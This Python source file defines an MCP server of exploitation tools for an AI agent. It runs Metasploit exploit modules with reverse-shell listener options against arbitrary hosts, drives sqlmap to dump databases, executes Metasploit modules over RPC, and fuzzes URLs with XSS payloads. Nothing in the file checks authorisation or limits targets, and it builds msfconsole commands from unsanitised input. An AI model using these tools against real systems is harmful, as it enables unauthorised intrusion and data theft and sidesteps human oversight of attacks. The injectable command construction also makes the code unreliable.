import asyncio
import subprocess
import os
import json
import requests
from pymetasploit3.msfrpc import MsfRpcClient
import urllib.parse
from fastmcp import FastMCP, Context
from fastmcp.exceptions import ToolError
from typing import Annotated, Literal, Optional, List, Dict, Any
from pydantic import Field

# --- III. Exploitation & Gaining Access ---
mcp_exploit = FastMCP(name="ExploitationTools", instructions="Tools for attempting to exploit vulnerabilities.")

@mcp_exploit.tool()
async def run_exploit_module(
    target_host: Annotated[str, Field(description="The IP address or hostname of the target.")],
    target_port: Annotated[int, Field(description="The port number of the vulnerable service on the target.")],
    exploit_name: Annotated[str, Field(description="Name of the exploit module to use.")],
    ctx: Context,
    payload_name: Annotated[Optional[str], Field(description="Name of the payload to use.")]=None,
    listener_host: Annotated[Optional[str], Field(description="IP address for the reverse shell listener.")]=None,
    listener_port: Annotated[Optional[int], Field(description="Port for the reverse shell listener.")]=None,
    exploit_options: Annotated[Optional[Dict[str, str]], Field(description="Additional options for the exploit module.")]=None
) -> Dict[str, Any]:
    await ctx.info(f"Running exploit {exploit_name} against {target_host}:{target_port}")
    rc = subprocess.call(['msfconsole', '-q', '-x', f"use {exploit_name}; set RHOST {target_host}; set RPORT {target_port}; {'; '.join(f'set {k} {v}' for k,v in (exploit_options or {}).items())}; exploit; exit"])
    status = 'success' if rc == 0 else 'failed'
    return {"exploit_name": exploit_name, "status": status}

@mcp_exploit.tool()
async def sql_injection_exploit(
    target_url: Annotated[str, Field(description="The vulnerable URL.")],
    ctx: Context,
    vulnerable_parameter: Annotated[Optional[str], Field(description="Parameter suspected to be vulnerable.")]=None,
    http_method: Annotated[Literal["GET", "POST"], Field(description="HTTP method.")]="GET",
    post_data: Annotated[Optional[str], Field(description="Data for POST requests.")]=None,
    dbms: Annotated[Optional[str], Field(description="Backend DBMS.")]=None,
    action: Annotated[Literal["check", "dump_dbs", "dump_table", "get_current_user"], Field(description="Action to perform.")]="check",
    table_to_dump: Annotated[Optional[str], Field(description="Table to dump.")]=None,
    db_to_dump_from: Annotated[Optional[str], Field(description="Database to dump from.")]=None
) -> Dict[str, Any]:
    await ctx.info(f"Running SQLMap on {target_url} action={action}")
    cmd = ['sqlmap', '-u', target_url, '--batch', f'--{action}']
    if vulnerable_parameter:
        cmd += ['-p', vulnerable_parameter]
    if table_to_dump and action=='dump_table':
        cmd += ['-T', table_to_dump]
    if db_to_dump_from and action=='dump_table':
        cmd += ['-D', db_to_dump_from]
    proc = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    out,_ = await proc.communicate()
    return {"target_url": target_url, "output": out.decode()}
@mcp_exploit.tool()
async def msf_rpc_exploit(
    module: Annotated[str, Field(description="Metasploit module in type/name format.")],
    params: Annotated[Dict[str, str], Field(description="Parameters for the module.")],
    ctx: Context,
    host: Annotated[str, Field(description="RPC host.")]="127.0.0.1",
    port: Annotated[int, Field(description="RPC port.")]=55553,
    username: Annotated[Optional[str], Field(description="RPC username.")]=None,
    password: Annotated[Optional[str], Field(description="RPC password.")]=None
) -> Dict[str, Any]:
    await ctx.info(f"Connecting to Metasploit RPC at {host}:{port}")
    rpc_user = username or os.getenv("MSF_USER") or ""
    rpc_pass = password or os.getenv("MSF_PASSWORD") or ""
    try:
        client = MsfRpcClient(rpc_pass, username=rpc_user, port=port)
        mtype, mname = module.split("/")
        mod = client.modules.use(mtype, mname)
        for k, v in params.items():
            mod[k] = v
        job_id = mod.execute()
        return {"module": module, "job_id": job_id}
    except Exception as e:
        return {"error": str(e)}

@mcp_exploit.tool()
async def xss_fuzzer(
    target_url: Annotated[str, Field(description="Base URL for XSS fuzzing.")],
    ctx: Context,
    param: Annotated[str, Field(description="Query parameter to fuzz.")],
    payloads: Annotated[Optional[List[str]], Field(description="List of XSS payloads to test.")]=None
) -> Dict[str, Any]:
    await ctx.info(f"Starting XSS fuzzing on {target_url}")
    tests = payloads or ["<script>alert(1)</script>"]
    results = []
    for p in tests:
        url = f"{target_url}?{param}={urllib.parse.quote(p)}"
        proc = await asyncio.create_subprocess_exec("curl", "-s", url, stdout=asyncio.subprocess.PIPE)
        out, _ = await proc.communicate()
        vulnerable = p in out.decode()
        results.append({"payload": p, "vulnerable": vulnerable})
    return {"target_url": target_url, "param": param, "results": results}

if __name__ == "__main__":
    print("Cybersecurity AI Exploit service starting...")
    mcp_exploit.run(transport="stdio")